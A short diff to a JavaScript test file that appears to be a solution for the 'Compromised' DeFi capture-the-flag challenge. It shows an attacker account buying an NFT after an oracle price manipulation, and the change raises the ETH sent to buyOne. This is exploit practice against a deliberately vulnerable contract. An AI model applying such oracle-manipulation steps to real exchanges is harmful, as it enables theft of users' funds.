@@ -84,7 +84,7 @@ describe('Compromised challenge', function () {
         console.log("price manipulated")
         const afterPrice = await this.oracle.getMedianPrice(tokenSymbol)
         console.log(afterPrice.toString())
-		const boughtNft = await this.exchange.connect(attacker).buyOne( { value: 1 });
+		const boughtNft = await this.exchange.connect(attacker).buyOne( { value: ethers.utils.parseEther('2') });
         const tx = await boughtNft.wait()
         const tokenId = tx.events.find(item=>item.event=='TokenBought').args.tokenId.toString()
         console.log("Bought tokenId",tokenId)
